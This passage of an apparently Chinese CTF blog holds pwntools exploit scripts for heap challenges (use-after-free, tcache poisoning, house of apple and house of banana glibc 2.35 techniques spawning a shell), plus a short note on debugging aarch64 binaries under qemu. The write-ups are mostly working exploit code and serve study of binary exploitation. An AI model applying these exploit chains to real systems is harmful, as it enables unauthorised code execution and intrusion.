&#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def add(index,size,name,tag,func = 2):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;1&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(index))</span><br><span class="line">    sla(&quot;name_length: &quot;,str(size))</span><br><span class="line">    sla(&quot;name: &quot;,name)</span><br><span class="line">    sla(&quot;tag: &quot;,tag)</span><br><span class="line">    sla(&quot;func: &quot;,str(func))</span><br><span class="line"></span><br><span class="line">def edit_name(idx,size,name):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;1&#x27;)</span><br><span class="line">    sla(&quot;name_length: &quot;,str(size))</span><br><span class="line">    io.sendlineafter(&quot;name: &quot;,name)</span><br><span class="line"></span><br><span class="line">def edit_tag(idx,tag):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    io.sendafter(&quot;new tag: &quot;,tag)</span><br><span class="line"></span><br><span class="line">def edit_func(idx,func):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">    sla(&quot;func: &quot;,str(func))</span><br><span class="line"></span><br><span class="line">def call(idx):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">add(0,0x420,b&#x27;A&#x27;*0x420,b&#x27;&#x27;)</span><br><span class="line">edit_tag(0, p64(0xdeadbeefdeadbeef))</span><br><span class="line">edit_func(0, 1)</span><br><span class="line">call(0)</span><br><span class="line"></span><br><span class="line">ru(b&#x27;\xef\xbe\xad\xde\xef\xbe\xad\xde&#x27;)</span><br><span class="line">base=u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))-0x131b</span><br><span class="line">print(&quot;base:&quot;+hex(base))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x10,b&#x27;youlin&#x27;)</span><br><span class="line">add(1,0x10,b&#x27;youlin&#x27;,b&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+p64(0)+p64(base+0x131b)+p64(base+elf.got[&#x27;puts&#x27;])+p64(0x421))</span><br><span class="line"></span><br><span class="line">call(1)</span><br><span class="line">libcbase = uu64() - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+b&#x27;/bin/sh&#x27;.ljust(0x8,b&#x27;\x00&#x27;)+p64(system))</span><br><span class="line">call(1)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h2><p>比较简单的一道题，直接给了uaf，因为一开始用house of banana在本机一直打不通，刚好又看到pursue师傅的博客用的house of apple，刚好了解下house of apple</p>
<p>house of apple具体原理：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/549114257">https://zhuanlan.zhihu.com/p/549114257</a></p>
<p>先将_IO_list_all修改为堆上伪造io的地址，然后利用模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_file1 = b&#x27;\x00&#x27; * (0x10)</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_base</span><br><span class="line">fake_file1 += p64(1)    # fp -&gt; _IO_write_ptr</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_end</span><br><span class="line">fake_file1 = fake_file1.ljust(0x78, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase)     # _lock</span><br><span class="line">fake_file1 = fake_file1.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase + 0xf00 + 0x100)    # _wide_data</span><br><span class="line">fake_file1 = fake_file1.ljust(0xc8, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      # vtable</span><br><span class="line">fake_file1 = fake_file1.ljust(0x100 - 0x10, b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">fake_wide = b&#x27;\x00&#x27; * 0x68</span><br><span class="line">fake_wide += p64(ogg)     # _wide_vtable + 0x68</span><br><span class="line"># fake_wide = fake_wide.ljust(0xa0, b&#x27;\x00&#x27;)</span><br><span class="line"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span><br><span class="line"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span><br><span class="line">fake_wide = fake_wide.ljust(0xe0, b&#x27;\x00&#x27;)</span><br><span class="line">fake_wide += p64(heapbase + 0xf00 + 0x100)     # _wide_vtable</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./note2&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def add(idx, size, content):</span><br><span class="line">    sla(&#x27;------------&#x27;, b&#x27;1&#x27;)</span><br><span class="line">    sla(&#x27;Index?&#x27;, str(idx))</span><br><span class="line">    sla(&#x27;Size?&#x27;, str(size))</span><br><span class="line">    sla(&#x27;Enter content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sla(&#x27;------------&#x27;, b&#x27;2&#x27;)</span><br><span class="line">    sla(&#x27;Index?&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&#x27;------------&#x27;, b&#x27;3&#x27;)</span><br><span class="line">    sla(&#x27;Index?&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def leave():</span><br><span class="line">    sla(&#x27;------------&#x27;, b&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    add(i,0x108,b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">show(1)</span><br><span class="line">r()</span><br><span class="line">key=u64(io.recv(5).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">heapbase=key&lt;&lt;12</span><br><span class="line">print(&quot;heapbase:&quot;+hex(heapbase))</span><br><span class="line"></span><br><span class="line">for i in range(2,8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libcbase=uu64()-0x219ce0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">pop_rdi=libcbase+0x000000000002a3e5</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">io_list_all = libcbase + libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">io_wfile_jumps = libcbase + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line">ogg = libcbase + 0xebcf5</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    add(i, 0x108, b&#x27;youlin&#x27;)</span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i, 0x68, b&#x27;youlin&#x27;)</span><br><span class="line">for i in range(9):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(7)</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i, 0x68, b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">add(0, 0x68, p64(key ^ io_list_all))</span><br><span class="line">add(1, 0x68, b&#x27;youlin&#x27;)</span><br><span class="line">add(2, 0x68, b&#x27;youlin&#x27;)</span><br><span class="line">add(3, 0x68, p64(heapbase + 0xf00))</span><br><span class="line"></span><br><span class="line">fake_file1 = b&#x27;\x00&#x27; * (0x10)</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_base</span><br><span class="line">fake_file1 += p64(1)    # fp -&gt; _IO_write_ptr</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_end</span><br><span class="line">fake_file1 = fake_file1.ljust(0x78, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase)     # _lock</span><br><span class="line">fake_file1 = fake_file1.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase + 0xf00 + 0x100)    # _wide_data</span><br><span class="line">fake_file1 = fake_file1.ljust(0xc8, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      # vtable</span><br><span class="line">fake_file1 = fake_file1.ljust(0x100 - 0x10, b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">fake_wide = b&#x27;\x00&#x27; * 0x68</span><br><span class="line">fake_wide += p64(ogg)     # _wide_vtable + 0x68</span><br><span class="line"># fake_wide = fake_wide.ljust(0xa0, b&#x27;\x00&#x27;)</span><br><span class="line"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span><br><span class="line"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span><br><span class="line">fake_wide = fake_wide.ljust(0xe0, b&#x27;\x00&#x27;)</span><br><span class="line">fake_wide += p64(heapbase + 0xf00 + 0x100)     # _wide_vtable</span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line"></span><br><span class="line">add(4, 0x200, fake_file1)</span><br><span class="line">leave()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<p>经过不断的调试和pursue师傅的教学，发现是因为我本机的Ubuntu22.04和远程的环境不太一样（明明glibc版本都是Ubuntu GLIBC 2.35-0ubuntu3.1）具体原因不太清楚了，最后发现是_rtld_global和l_next两个需要伪造和修改的地址不一样</p>
<p>banana exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"># encoding = utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./note2&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def menu(n):</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(n))</span><br><span class="line"></span><br><span class="line">def add(idx, size, con):</span><br><span class="line">    menu(1)</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(idx))</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(size))</span><br><span class="line">    sla(b&#x27;: &#x27;, con)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(i,0xf8,b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">key=u64(io.recv(5).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">heapbase=key&lt;&lt;12</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">show(8)</span><br><span class="line">libcbase=uu64()-0x219ce0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">sh = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">set_context = libcbase + libc.sym[&#x27;setcontext&#x27;] + 61</span><br><span class="line">l_next = libcbase + 0x276890</span><br><span class="line">print(&quot;l_next:&quot;+hex(l_next))</span><br><span class="line">rtld = libcbase + 0x275040</span><br><span class="line">ret = libcbase + 0x29cd6</span><br><span class="line">pop_rdi = libcbase + 0x2a3e5</span><br><span class="line">environ = libcbase + 0x221200</span><br><span class="line">dbg()</span><br><span class="line"></span><br><span class="line">delete(7)</span><br><span class="line">add(6,0x1f8,b&#x27;youlin&#x27;)</span><br><span class="line">add(0,0xf8,b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)</span><br><span class="line">add(0,0x1f0,b&#x27;A&#x27;*0xf0+p64(0)+p64(0x101)+p64((rtld)^key))</span><br><span class="line"></span><br><span class="line">add(0,0xf0,b&#x27;youlin&#x27;)</span><br><span class="line">add(0,0xf0,p64(heapbase+0xcb0)+ b&#x27;\x04&#x27;+ b&#x27;\x00&#x27;*7)</span><br><span class="line"></span><br><span class="line">fake_rtld_global_addr = heapbase + 0xcb0</span><br><span class="line">fake_rtld_global = p64(0) + p64(l_next) + p64(0) + p64(fake_rtld_global_addr)</span><br><span class="line">fake_rtld_global += p64(set_context) + p64(ret)</span><br><span class="line">fake_rtld_global += p64(sh)</span><br><span class="line">fake_rtld_global += p64(ret)</span><br><span class="line">fake_rtld_global += p64(system)</span><br><span class="line">fake_rtld_global += b&#x27;\x00&#x27; * 0x80</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + 0x28 + 0x18)</span><br><span class="line">fake_rtld_global += p64(pop_rdi)</span><br><span class="line">fake_rtld_global += b&#x27;\x00&#x27; * (0x100 - len(fake_rtld_global))</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + 0x10 + 0x110) * 3</span><br><span class="line">fake_rtld_global += p64(0x10)</span><br><span class="line"></span><br><span class="line">add(0, 0x18, b&#x27;a&#x27; * 0x10 + p64(fake_rtld_global_addr + 0x20))</span><br><span class="line">add(1, 0x200, fake_rtld_global)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x00&#x27; * 0xfc</span><br><span class="line">payload += p8(0x8) + b&#x27;\x00&#x27; * 3</span><br><span class="line">add(2, 0x200, payload)</span><br><span class="line">menu(4)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/21/aarch64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/21/aarch64/" class="post-title-link" itemprop="url">aarch64</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-09-21 18:57:38 / Modified: 19:05:33" itemprop="dateCreated datePublished" datetime="2022-09-21T18:57:38+08:00">2022-09-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="记录aarch64的运行和调试方法"><a href="#记录aarch64的运行和调试方法" class="headerlink" title="记录aarch64的运行和调试方法"></a>记录aarch64的运行和调试方法</h1><h2 id="以d3招新赛的stack为例"><a href="#以d3招新赛的stack为例" class="headerlink" title="以d3招新赛的stack为例"></a>以d3招新赛的stack为例</h2><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></table></figure>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>用gdb-multiarch调试确定溢出长度</p>
<p>先将程序在指定端口跑起来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></table></figure>

<p>gdb-multiarch调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./stack</span><br><span class="line"></span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p>按c继续运行程序，用pwntools生成字符串并输入到qemu运行的程序中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">cyclic(100)</span><br></pre></td></tr></table></figure>

<p><img src="https://tuchuangs.com/imgs/2022/09/21/38f62e643cc3c89e.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
